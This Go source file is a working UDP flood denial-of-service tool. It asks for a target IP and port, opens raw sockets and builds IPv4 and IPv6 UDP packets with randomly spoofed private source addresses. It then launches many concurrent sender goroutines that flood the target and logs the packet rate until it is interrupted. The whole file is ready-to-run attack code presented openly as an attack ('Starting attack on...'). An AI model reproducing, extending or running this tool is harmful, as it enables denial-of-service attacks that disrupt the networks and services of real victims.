package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	sent    uint64
	stop    uint32
	fd      int
	addr    syscall.Sockaddr
	isIPv6  bool
	iface   string
	workers int
)

func getInterface() string {
	ifaces, err := net.Interfaces()
	if err != nil {
		return "eth0"
	}
	for _, i := range ifaces {
		if i.Flags&net.FlagUp != 0 && i.Flags&net.FlagLoopback == 0 {
			addrs, _ := i.Addrs()
			if len(addrs) > 0 {
				return i.Name
			}
		}
	}
	return "eth0"
}

func parseTarget(input string) (net.IP, uint32, error) {
	ipPart, zone, hasZone := strings.Cut(input, "%")
	ip := net.ParseIP(ipPart)
	if ip == nil {
		return nil, 0, fmt.Errorf("invalid target IP: %s", input)
	}
	if !hasZone || zone == "" {
		return ip, 0, nil
	}
	if ip.To4() != nil {
		return nil, 0, fmt.Errorf("IPv4 addresses do not support zones: %s", input)
	}
	if index, err := strconv.Atoi(zone); err == nil {
		return ip, uint32(index), nil
	}
	iface, err := net.InterfaceByName(zone)
	if err != nil {
		return nil, 0, fmt.Errorf("invalid zone %q: %w", zone, err)
	}
	return ip, uint32(iface.Index), nil
}

func setupRaw(targetIP net.IP, zoneID uint32, targetPort int) {
	var err error
	isIPv6 = targetIP.To4() == nil
	if isIPv6 {
		fd, err = syscall.Socket(syscall.AF_INET6, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	} else {
		fd, err = syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	}
	if err != nil {
		log.Fatal(err)
	}
	iface = getInterface()
	if err := syscall.SetsockoptString(fd, syscall.SOL_SOCKET, syscall.SO_BINDTODEVICE, iface); err != nil {
		log.Fatal(err)
	}
	if isIPv6 {
		if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IPV6, syscall.IPV6_HDRINCL, 1); err != nil {
			log.Fatal(err)
		}
	} else {
		if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
			log.Fatal(err)
		}
	}
	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 134217728); err != nil {
		log.Fatal(err)
	}
	if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 134217728); err != nil {
		log.Fatal(err)
	}
	if isIPv6 {
		target := targetIP.To16()
		var addr6 syscall.SockaddrInet6
		copy(addr6.Addr[:], target)
		addr6.Port = targetPort
		addr6.ZoneId = zoneID
		addr = &addr6
	} else {
		target := targetIP.To4()
		var addr4 syscall.SockaddrInet4
		copy(addr4.Addr[:], target)
		addr4.Port = targetPort
		addr = &addr4
	}
	workers = runtime.NumCPU() * 8
}

func checksum16(sum uint32) uint16 {
	for sum>>16 > 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func craftIPv4(src, dst net.IP, sport, dport int) []byte {
	buf := make([]byte, 28)
	ip := buf[:20]
	ip[0] = 0x45
	ip[1] = 0x00
	binary.BigEndian.PutUint16(ip[2:4], 28)
	binary.BigEndian.PutUint16(ip[4:6], uint16(rand.Intn(65535)))
	ip[6] = 0x40
	ip[8] = 0x40
	ip[9] = syscall.IPPROTO_UDP
	copy(ip[12:16], src)
	copy(ip[16:20], dst)
	udp := buf[20:28]
	binary.BigEndian.PutUint16(udp[0:2], uint16(sport))
	binary.BigEndian.PutUint16(udp[2:4], uint16(dport))
	binary.BigEndian.PutUint16(udp[4:6], 8)
	psum := uint32(0)
	for i := 0; i < 4; i += 2 {
		psum += uint32(binary.BigEndian.Uint16(src[i:]))
	}
	for i := 0; i < 4; i += 2 {
		psum += uint32(binary.BigEndian.Uint16(dst[i:]))
	}
	psum += uint32(syscall.IPPROTO_UDP) + 8
	for i := 20; i < 28; i += 2 {
		if i+1 < 28 {
			psum += uint32(binary.BigEndian.Uint16(buf[i:]))
		} else {
			psum += uint32(buf[i]) << 8
		}
	}
	udpChecksum := checksum16(psum)
	udp[6] = byte(udpChecksum >> 8)
	udp[7] = byte(udpChecksum)
	csum := uint32(0)
	for i := 0; i < 20; i += 2 {
		csum += uint32(binary.BigEndian.Uint16(ip[i:]))
	}
	binary.BigEndian.PutUint16(ip[10:12], checksum16(csum))
	return buf
}

func craftIPv6(src, dst net.IP, sport, dport int) []byte {
	buf := make([]byte, 48)
	ip := buf[:40]
	ip[0] = 0x60
	binary.BigEndian.PutUint16(ip[4:6], 8)
	ip[6] = syscall.IPPROTO_UDP
	ip[7] = 0x40
	copy(ip[8:24], src)
	copy(ip[24:40], dst)
	udp := buf[40:48]
	binary.BigEndian.PutUint16(udp[0:2], uint16(sport))
	binary.BigEndian.PutUint16(udp[2:4], uint16(dport))
	binary.BigEndian.PutUint16(udp[4:6], 8)
	psum := uint32(0)
	for i := 0; i < 16; i += 2 {
		psum += uint32(binary.BigEndian.Uint16(src[i:]))
	}
	for i := 0; i < 16; i += 2 {
		psum += uint32(binary.BigEndian.Uint16(dst[i:]))
	}
	psum += uint32(8)
	psum += uint32(syscall.IPPROTO_UDP)
	for i := 40; i < 48; i += 2 {
		psum += uint32(binary.BigEndian.Uint16(buf[i:]))
	}
	udpChecksum := checksum16(psum)
	udp[6] = byte(udpChecksum >> 8)
	udp[7] = byte(udpChecksum)
	return buf
}

func sender(id int, wg *sync.WaitGroup, dst net.IP, dport int) {
	defer wg.Done()
	r := rand.New(rand.NewSource(time.Now().UnixNano() + int64(id)))
	packets := make([][]byte, 1024)
	for i := range packets {
		if isIPv6 {
			src := make(net.IP, net.IPv6len)
			src[0] = 0xfd
			for j := 1; j < net.IPv6len; j++ {
				src[j] = byte(r.Intn(256))
			}
			packets[i] = craftIPv6(src, dst, 1024+r.Intn(64512), dport)
		} else {
			src := net.IPv4(10, byte(r.Intn(256)), byte(r.Intn(256)), byte(r.Intn(254)+1)).To4()
			packets[i] = craftIPv4(src, dst, 1024+r.Intn(64512), dport)
		}
	}
	for atomic.LoadUint32(&stop) == 0 {
		for _, pkt := range packets {
			syscall.Sendto(fd, pkt, 0, addr)
		}
		atomic.AddUint64(&sent, uint64(len(packets)))
		if sent%1000000 == 0 {
			time.Sleep(time.Microsecond * time.Duration(r.Intn(50)))
		}
	}
}

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Target IP: ")
	targetIP, _ := reader.ReadString('\n')
	targetIP = strings.TrimSpace(targetIP)
	fmt.Print("Target Port: ")
	var targetPort int
	fmt.Scanf("%d", &targetPort)
	fmt.Printf("Starting attack on %s:%d...\n", targetIP, targetPort)
	parsedTarget, zoneID, err := parseTarget(targetIP)
	if err != nil {
		log.Fatal(err)
	}
	setupRaw(parsedTarget, zoneID, targetPort)
	defer syscall.Close(fd)
	if isIPv6 {
		parsedTarget = parsedTarget.To16()
	} else {
		parsedTarget = parsedTarget.To4()
	}
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go sender(i, &wg, parsedTarget, targetPort)
	}
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	fmt.Println("Attack running. Press Ctrl+C to stop.")
	for atomic.LoadUint32(&stop) == 0 {
		select {
		case <-sig:
			atomic.StoreUint32(&stop, 1)
		case <-ticker.C:
			s := atomic.SwapUint64(&sent, 0)
			log.Printf("pps: %d", s)
		}
	}
	wg.Wait()
	fmt.Println("Attack stopped.")
}
